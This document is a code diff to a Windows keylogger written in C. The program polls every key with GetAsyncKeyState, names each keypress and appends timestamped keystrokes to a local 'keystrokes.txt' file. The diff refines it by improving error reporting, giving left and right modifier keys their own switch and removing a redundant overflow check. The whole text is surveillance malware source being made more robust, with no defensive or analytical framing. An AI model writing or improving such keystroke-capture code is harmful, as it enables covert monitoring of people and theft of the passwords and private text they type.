@@ -6,6 +6,7 @@
 #include <errno.h>
 #include <string.h>
 #include <limits.h> // For INT_MAX
+#include <stddef.h> // For size_t
 
 #define LOG_FILE "keystrokes.txt"
 #define TIMESTAMP_FORMAT "%Y-%m-%d %H:%M:%S"
@@ -21,7 +22,13 @@ bool get_timestamp(char *timestamp, size_t timestamp_size) {
 
     time(&rawtime);
     if (localtime_s(&timeinfo, &rawtime) != 0) {
-        fprintf(stderr, "Error: localtime_s failed.\n");
+        int err = errno; // Capture errno before printing
+        char error_message[MAX_ERROR_MESSAGE_LENGTH];
+        if (strerror_s(error_message, sizeof(error_message), err) == 0) {
+            fprintf(stderr, "Error: localtime_s failed: %s\n", error_message);
+        } else {
+            fprintf(stderr, "Error: localtime_s failed: Unknown error.\n");
+        }
         timestamp[0] = '\0';
         return false;
     }
@@ -39,20 +46,24 @@ const char* get_key_name(int key) {
     static char key_name[MAX_KEY_NAME_LENGTH];
     UINT scan_code = MapVirtualKey(key, MAPVK_VK_TO_VSC);
 
+    // Handle extended keys first to avoid conflicts with regular keys
+    switch (key) {
+        case VK_LSHIFT: return "[LSHIFT]"; // Distinguish left and right shift
+        case VK_RSHIFT: return "[RSHIFT]";
+        case VK_LCONTROL: return "[LCTRL]"; // Distinguish left and right control
+        case VK_RCONTROL: return "[RCTRL]";
+        case VK_LMENU: return "[LALT]"; // Distinguish left and right alt
+        case VK_RMENU: return "[RALT]";
+    }
+
     switch (key) {
         case VK_SPACE: return " ";
         case VK_RETURN: return "\n";
         case VK_TAB: return "\t";
         case VK_BACK: return "[BACKSPACE]";
         case VK_SHIFT: return "[SHIFT]";
-        case VK_LSHIFT: return "[LSHIFT]"; // Distinguish left and right shift
-        case VK_RSHIFT: return "[RSHIFT]";
         case VK_CONTROL: return "[CTRL]";
-        case VK_LCONTROL: return "[LCTRL]"; // Distinguish left and right control
-        case VK_RCONTROL: return "[RCTRL]";
         case VK_MENU: return "[ALT]";
-        case VK_LMENU: return "[LALT]"; // Distinguish left and right alt
-        case VK_RMENU: return "[RALT]";
         case VK_CAPITAL: return "[CAPSLOCK]";
         case VK_ESCAPE: return "[ESCAPE]";
         default:
@@ -94,8 +105,9 @@ bool log_keystroke(int key) {
     fprintf(file, "[%s] %s\n", timestamp, get_key_name(key));
 
     if (fclose(file) == EOF) {
+        int close_err = errno; // Capture errno before printing
         char error_message[MAX_ERROR_MESSAGE_LENGTH];
-        if (strerror_s(error_message, sizeof(error_message), errno) == 0) {
+        if (strerror_s(error_message, sizeof(error_message), close_err) == 0) {
             fprintf(stderr, "Error closing %s: %s\n", LOG_FILE, error_message);
         } else {
             fprintf(stderr, "Error closing %s: Unknown error.\n", LOG_FILE);
@@ -114,12 +126,6 @@ int main() {
 
     while (1) {
         for (key = 1; key < NUM_KEYS; key++) {
-            // Check for integer overflow
-            if (key > INT_MAX - 1) {
-                fprintf(stderr, "Integer overflow detected. Exiting loop.\n");
-                return 1;
-            }
-
             if (GetAsyncKeyState(key) & 0x8000) {
                 if (!key_pressed[key]) {
                     if (!log_keystroke(key)) {
